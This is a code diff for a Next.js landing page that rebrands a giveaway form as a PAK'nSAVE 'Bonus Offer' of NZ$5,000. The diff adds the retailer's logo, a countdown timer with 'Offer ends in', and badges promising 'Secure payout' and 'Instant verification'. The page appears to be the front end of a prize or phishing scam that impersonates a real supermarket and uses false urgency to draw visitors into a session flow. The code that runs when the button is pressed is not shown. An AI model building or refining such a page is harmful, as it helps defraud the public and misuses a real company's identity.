@@ -1,14 +1,11 @@
 "use client";
 
 import { useState, useEffect } from "react";
-import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
-import LiveToast from "@/components/LiveToast";
 import { useSettings } from "@/contexts/SettingsContext";
 import { persistActiveSession } from "@/lib/session-id-client";
 
 export default function Home() {
-  
   const { settings } = useSettings();
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
@@ -71,72 +68,94 @@ export default function Home() {
   };
 
   return (
-    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <main className="w-full max-w-[650px] relative z-10 fade-in">
-        <div className="rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 text-center relative overflow-hidden">
-          
-          <div className="mb-6 flex justify-center">
-            <div className="rounded-full bg-white/5 p-4 ring-4 ring-white/5">
-              <svg className="h-12 w-12 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
-              </svg>
+    <div className="pak-page-shell">
+      <main className="relative z-10 w-full max-w-[820px] fade-in">
+        <div className="pak-form-card overflow-hidden">
+          <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-7 sm:pb-8 sm:pt-8 lg:px-10 lg:pb-9 lg:pt-9">
+            <div className="grid gap-6 lg:grid-cols-[minmax(0,1.08fr)_84px] lg:items-start">
+              <div className="min-w-0">
+                <div className="mb-4 inline-flex max-w-full items-center gap-2 rounded-full border border-[#ffdb4d]/35 bg-[#5a0808]/35 px-4 py-2 text-left">
+                  <span className="relative flex h-2.5 w-2.5 shrink-0">
+                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-red-400 opacity-75" />
+                    <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-red-500" />
+                  </span>
+                  <span className="text-xs font-extrabold uppercase tracking-[0.14em] text-[#ffb3b3]">
+                    Offer ends in: {formatTime(timeLeft)}
+                  </span>
+                </div>
+
+                <div className="max-w-[30rem]">
+                  <h1 className="pak-form-title">{settings.win_title}</h1>
+                  <p className="pak-form-subtitle mt-4 max-w-[28rem] text-[0.98rem] sm:text-[1rem]">
+                    {settings.win_subtitle}
+                  </p>
+                </div>
+
+                <div className="pak-form-amount mt-5 inline-flex w-full max-w-[19rem] px-4 py-3 sm:max-w-[20rem] sm:px-5 sm:py-3.5">
+                  <div className="pak-form-amount-label">
+                    <div>Today's</div>
+                    <div>Bonus Offer</div>
+                  </div>
+                  <div className="pak-form-amount-divider" />
+                  <div className="pak-form-amount-value">NZ$5,000</div>
+                </div>
+
+                {error && (
+                  <div className="mt-5 flex items-start gap-2 rounded-xl border border-red-500/20 bg-red-500/10 p-3 text-left text-sm text-red-300">
+                    <svg className="mt-0.5 h-5 w-5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    {error}
+                  </div>
+                )}
+
+                <button
+                  onClick={() => void handleStart()}
+                  disabled={loading || timeLeft === 0}
+                  className="pak-form-button mt-6 min-h-[4rem] w-full max-w-[20rem] px-6 text-lg sm:text-[1.1rem]"
+                >
+                  {loading ? (
+                    <span className="flex items-center justify-center gap-2">
+                      <svg className="h-5 w-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                      </svg>
+                      Processing...
+                    </span>
+                  ) : (
+                    <span className="flex items-center justify-center gap-2">
+                      {settings.win_button}
+                      <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
+                      </svg>
+                    </span>
+                  )}
+                </button>
+
+                <div className="mt-7 flex flex-wrap items-center gap-3 border-t border-white/10 pt-5 text-[0.77rem] font-semibold uppercase tracking-[0.16em] text-[#fff0a6]/75">
+                  <div className="flex items-center gap-2">
+                    <svg className="h-4 w-4 text-[#ffd500]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                    </svg>
+                    Secure payout
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <svg className="h-4 w-4 text-[#ffd500]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                    </svg>
+                    Instant verification
+                  </div>
+                </div>
+              </div>
+
+              <div className="flex items-start justify-end gap-4 lg:block">
+                <img
+                  src="/form-assets/paknsave-logo-form.png"
+                  alt="PAK'nSAVE"
+                  className="pak-form-brand-logo lg:ml-auto lg:mb-4"
+                />
+              </div>
             </div>
-          </div>
-          
-          <h1 className="text-2xl font-bold text-white mb-3">{settings.win_title}</h1>
-          
-          <div className="inline-flex items-center justify-center gap-2 rounded-xl bg-red-500/10 px-4 py-2 mb-6 border border-red-500/20">
-            <span className="relative flex h-2.5 w-2.5">
-              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
-              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
-            </span>
-            <span className="text-xs font-bold text-red-400">Offer ends in: {formatTime(timeLeft)}</span>
-          </div>
-
-          <p className="text-sm text-gray-300 mb-8 leading-relaxed font-medium">
-            {settings.win_subtitle}
-          </p>
-
-          {error && (
-            <div className="mb-6 rounded-xl bg-red-500/10 p-3 text-sm text-red-400 border border-red-500/20 text-left flex items-start gap-2">
-              <svg className="w-5 h-5 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
-              {error}
-            </div>
-          )}
-
-          <button
-            onClick={() => void handleStart()}
-            disabled={loading || timeLeft === 0}
-            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60 flex items-center justify-center gap-2"
-          >
-            {loading ? (
-              <>
-                <svg className="animate-spin -ml-1 mr-2 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-                Processing...
-              </>
-            ) : (
-              <>
-                {settings.win_button}
-                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
-                </svg>
-              </>
-            )}
-          </button>
-
-          {/* Trust badges */}
-          <div className="mt-8 pt-6 border-t border-white/10 flex flex-wrap items-center justify-center gap-4 sm:gap-6 text-gray-400">
-             <div className="flex items-center gap-1.5 text-xs font-medium">
-                <svg className="w-4 h-4 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
-                Secure payout
-             </div>
-             <div className="flex items-center gap-1.5 text-xs font-medium">
-                <svg className="w-4 h-4 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
-                Available now
-             </div>
           </div>
         </div>
       </main>
